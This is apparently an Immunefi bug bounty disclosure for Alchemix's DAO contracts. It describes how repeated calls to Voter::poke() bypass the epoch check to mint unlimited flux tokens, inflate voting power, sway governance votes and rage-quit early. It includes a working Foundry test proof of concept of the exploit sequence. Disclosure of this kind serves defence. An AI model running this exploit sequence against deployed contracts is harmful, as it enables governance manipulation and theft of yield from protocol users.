# 31444 - \[SC - Critical] Manipulation of ve voting mechanism unlimited b...

Submitted on May 19th 2024 at 11:53:51 UTC by @riptide for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31444

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Logic error in `Voter::poke()` allows any attacker to create a maximum `ve` lock, boost their voting power, vote to manipulate governance proposals with falsified voting power, then circumvent the cooldown period and immediately remove their lock.

## Vulnerability Details

Calling `Voter::poke()` will call `Voter::_vote()` directly which allows an attacker to bypass the `onlyNewEpoch` modifier that disallows multiple calls per epoch and normally prevents the calling of `Voter::accrueFlux()`. The logic within `Voter::accrueFlux()` contains an additive instruction `unclaimedFlux[_tokenId] += amount;` that allows an attacker to mint himself unlimited `flux` tokens by calling `Voter::poke()` repeatedly.

## Impact Details

The purpose of the `ve` voting and locking mechanism is that a user must lock up tokens for a set time period and is rewarded with greater voting power the longer one locks his tokens. Using this exploit, an attacker is able to lock up significant capital for the max lock time, mint `flux` tokens to further inflate voting power, vote to influence governance proposals with the grossly inflated voting power, then mint an unlimited amount of `flux` tokens to be able to `rage quit` and trigger the cooldown process. Ultimately the attacker only needs to allocate capital for one epoch (cooldown period) to catastrophically and unfairly manipulate governance voting results.

## References

Add any relevant links to documentation or code

## Proof of Concept

Add the following test to existing test suite in `FluxToken.t.sol`

```
function testFluxVotingManipulation() external {
        address bribeAddress = voter.bribes(address(sushiGauge));

        uint256 tokenId1 = createVeAlcx(beef, TOKEN_1M, veALCX.MAXTIME(), false);
        uint256 amount1 = veALCX.claimableFlux(tokenId1);
        uint256 unclaimedFlux1Start = flux.getUnclaimedFlux(tokenId1);

        assertEq(unclaimedFlux1Start, 0, "should start with no unclaimed flux");

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](2);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        uint i = 0;
        uint unclaimedFlux;
        uint maxVotingPower;

        hevm.startPrank(beef);

        uint maxBoost = voter.maxVotingPower(tokenId1) - IVotingEscrow(veALCX).balanceOfToken(tokenId1);
        uint256 ragequitAmount = veALCX.amountToRagequit(tokenId1);

        while(unclaimedFlux < (maxBoost + ragequitAmount)) {
            voter.poke(tokenId1);
            unclaimedFlux = flux.getUnclaimedFlux(tokenId1);
        }

        flux.approve(address(veALCX), unclaimedFlux);

        hevm.warp(newEpoch());

        uint maxBoost2 = voter.maxVotingPower(tokenId1) - IVotingEscrow(veALCX).balanceOfToken(tokenId1);

        voter.vote(tokenId1, pools, weights, maxBoost2);

        flux.claimFlux(tokenId1, ragequitAmount);
        flux.approve(address(veALCX), ragequitAmount);

        veALCX.startCooldown(tokenId1);
        hevm.warp(block.timestamp + nextEpoch);
        voter.reset(tokenId1);
        veALCX.withdraw(tokenId1);

        assertEq(IERC20(bpt).balanceOf(beef), TOKEN_1M);

        hevm.stopPrank();
    }
```
